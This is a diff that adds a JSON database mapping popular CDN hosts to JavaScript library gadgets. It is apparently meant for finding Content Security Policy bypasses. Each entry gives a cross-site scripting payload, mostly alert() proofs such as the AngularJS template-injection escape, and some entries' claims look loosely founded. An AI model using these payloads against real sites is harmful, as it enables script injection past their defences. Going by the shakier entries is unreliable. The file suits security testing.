@@ -1,0 +1,162 @@
+{
+  "cdnjs.cloudflare.com": [
+    {
+      "library": "angularjs",
+      "vulnerable_path": "/ajax/libs/angular.js/1.*/angular.min.js",
+      "max_safe_version": "1.6.0",
+      "technique": "AngularJS template injection via ng-app",
+      "payload": "<div ng-app>{{constructor.constructor('alert(document.domain)')()}}</div>",
+      "notes": "AngularJS < 1.6.0 allows template injection. With ng-app directive, expressions in {{}} execute as JS.",
+      "references": ["https://portswigger.net/research/xss-without-html-client-side-template-injection-with-angularjs"]
+    },
+    {
+      "library": "knockout",
+      "vulnerable_path": "/ajax/libs/knockout/*/knockout-min.js",
+      "max_safe_version": null,
+      "technique": "Knockout.js afterRender template injection",
+      "payload": "<div data-bind=\"template: { name: 'x', afterRender: alert }\">",
+      "notes": "All versions of Knockout.js support data-bind attributes that can execute arbitrary JS.",
+      "references": ["https://portswigger.net/web-security/cross-site-scripting/cheat-sheet"]
+    },
+    {
+      "library": "mithril",
+      "vulnerable_path": "/ajax/libs/mithril/*/mithril.min.js",
+      "max_safe_version": "1.0.0",
+      "technique": "Mithril.js m.trust() bypass",
+      "payload": "m.trust('<img src=x onerror=alert(1)>')",
+      "notes": "Mithril < 1.0 has DOM manipulation functions that can bypass CSP in certain contexts.",
+      "references": []
+    },
+    {
+      "library": "prototype",
+      "vulnerable_path": "/ajax/libs/prototype/*/prototype.js",
+      "max_safe_version": null,
+      "technique": "Prototype.js $$() selector injection",
+      "payload": "$$('*')[0].innerHTML='<img src=x onerror=alert(1)>'",
+      "notes": "Prototype.js provides powerful DOM manipulation that can be abused if attacker controls arguments.",
+      "references": []
+    },
+    {
+      "library": "dojo",
+      "vulnerable_path": "/ajax/libs/dojo/*/dojo.js",
+      "max_safe_version": null,
+      "technique": "Dojo Toolkit dijit template injection",
+      "payload": "<div data-dojo-type=\"dijit/Declaration\" data-dojo-props=\"widgetClass:'x',defaults:{onclick:function(){alert(1)}}\">",
+      "notes": "Dojo's declarative widget system can execute JS through template attributes.",
+      "references": []
+    }
+  ],
+  "cdn.jsdelivr.net": [
+    {
+      "library": "angularjs",
+      "vulnerable_path": "/npm/angular@1.*/angular.min.js",
+      "max_safe_version": "1.6.0",
+      "technique": "AngularJS template injection via ng-app",
+      "payload": "<div ng-app>{{constructor.constructor('alert(document.domain)')()}}</div>",
+      "notes": "Same AngularJS gadget, hosted on jsDelivr.",
+      "references": []
+    },
+    {
+      "library": "knockout",
+      "vulnerable_path": "/npm/knockout@*/build/output/knockout-latest.js",
+      "max_safe_version": null,
+      "technique": "Knockout.js data-bind injection",
+      "payload": "<div data-bind=\"template: { name: 'x', afterRender: alert }\">",
+      "notes": "Knockout.js on jsDelivr.",
+      "references": []
+    },
+    {
+      "library": "emberjs-debug",
+      "vulnerable_path": "/npm/ember-source@*/dist/ember.debug.js",
+      "max_safe_version": null,
+      "technique": "Ember.js debug mode helpers",
+      "payload": "Ember.lookup.alert(1)",
+      "notes": "Ember debug builds expose global lookup that can be abused for code execution.",
+      "references": []
+    }
+  ],
+  "unpkg.com": [
+    {
+      "library": "angularjs",
+      "vulnerable_path": "/angular@1.*/angular.min.js",
+      "max_safe_version": "1.6.0",
+      "technique": "AngularJS template injection via ng-app",
+      "payload": "<div ng-app>{{constructor.constructor('alert(document.domain)')()}}</div>",
+      "notes": "Same AngularJS gadget, hosted on unpkg.",
+      "references": []
+    },
+    {
+      "library": "knockout",
+      "vulnerable_path": "/knockout@*/build/output/knockout-latest.js",
+      "max_safe_version": null,
+      "technique": "Knockout.js data-bind injection",
+      "payload": "<div data-bind=\"template: { name: 'x', afterRender: alert }\">",
+      "notes": "Knockout.js on unpkg.",
+      "references": []
+    }
+  ],
+  "ajax.googleapis.com": [
+    {
+      "library": "angularjs",
+      "vulnerable_path": "/ajax/libs/angularjs/1.*/angular.min.js",
+      "max_safe_version": "1.6.0",
+      "technique": "AngularJS template injection via ng-app",
+      "payload": "<div ng-app>{{constructor.constructor('alert(document.domain)')()}}</div>",
+      "notes": "Google-hosted AngularJS. Very commonly whitelisted.",
+      "references": ["https://portswigger.net/research/xss-without-html-client-side-template-injection-with-angularjs"]
+    },
+    {
+      "library": "dojo",
+      "vulnerable_path": "/ajax/libs/dojo/*/dojo/dojo.js",
+      "max_safe_version": null,
+      "technique": "Dojo Toolkit template injection",
+      "payload": "<div data-dojo-type=\"dijit/Declaration\">...</div>",
+      "notes": "Google-hosted Dojo.",
+      "references": []
+    }
+  ],
+  "code.jquery.com": [
+    {
+      "library": "jquery",
+      "vulnerable_path": "/jquery-*.min.js",
+      "max_safe_version": "3.0.0",
+      "technique": "jQuery selector injection (limited)",
+      "payload": "$('<img src=x onerror=alert(1)>')",
+      "notes": "jQuery < 3.0 has selector-based XSS when attacker controls $() argument. Requires existing JS execution context.",
+      "references": ["https://nvd.nist.gov/vuln/detail/CVE-2015-9251"]
+    }
+  ],
+  "stackpath.bootstrapcdn.com": [
+    {
+      "library": "angularjs",
+      "vulnerable_path": null,
+      "max_safe_version": "1.6.0",
+      "technique": "AngularJS template injection",
+      "payload": "<div ng-app>{{constructor.constructor('alert(1)')()}}</div>",
+      "notes": "BootstrapCDN may host AngularJS versions.",
+      "references": []
+    }
+  ],
+  "raw.githubusercontent.com": [
+    {
+      "library": "any",
+      "vulnerable_path": "/*",
+      "max_safe_version": null,
+      "technique": "Arbitrary JS hosting",
+      "payload": "Attacker hosts malicious JS on their own GitHub repo",
+      "notes": "raw.githubusercontent.com serves raw file content from any public GitHub repo. Whitelisting this domain allows loading attacker-controlled scripts.",
+      "references": []
+    }
+  ],
+  "cdn.rawgit.com": [
+    {
+      "library": "any",
+      "vulnerable_path": "/*",
+      "max_safe_version": null,
+      "technique": "Arbitrary JS hosting",
+      "payload": "Attacker hosts malicious JS via RawGit CDN",
+      "notes": "RawGit serves GitHub files with proper content types. Same risk as raw.githubusercontent.com.",
+      "references": []
+    }
+  ]
+}
